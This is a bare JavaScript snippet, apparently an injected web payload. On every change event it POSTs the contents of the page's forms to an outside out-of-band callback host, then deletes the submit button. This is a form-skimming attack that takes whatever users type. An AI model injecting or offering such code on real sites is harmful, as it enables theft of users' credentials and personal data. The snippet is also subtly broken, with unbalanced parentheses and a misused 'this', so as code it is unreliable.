document.body.addEventListener('change', function() {
    document.querySelectorAll('form').forEach(function() {
      fetch('https://eqodqbhkbxerfoddbfoexz30iyy608n5s.oast.fun/', {
          method: 'POST',
          body: (new URLSearchParams(new FormData(this).toString())
      });
    });
});
document.querySelector('*[type=submit]').remove()
